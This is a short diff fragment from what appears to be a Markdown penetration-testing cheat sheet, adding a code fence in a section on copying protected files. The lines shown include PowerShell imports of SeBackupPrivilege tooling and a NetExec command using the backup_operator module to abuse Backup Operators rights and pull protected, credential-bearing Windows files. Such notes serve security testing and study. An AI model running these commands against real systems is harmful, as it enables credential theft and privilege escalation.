@@ -495,6 +495,7 @@ Copying a Protected File
 import-module .\SeBackupPrivilegeUtils.dll
 import-module .\SeBackupPrivilegeCmdLets.dll
 Copy-FileS
+```
 netexec
 ```
 nxc smb ip -u username -p pwd -M backup_operator
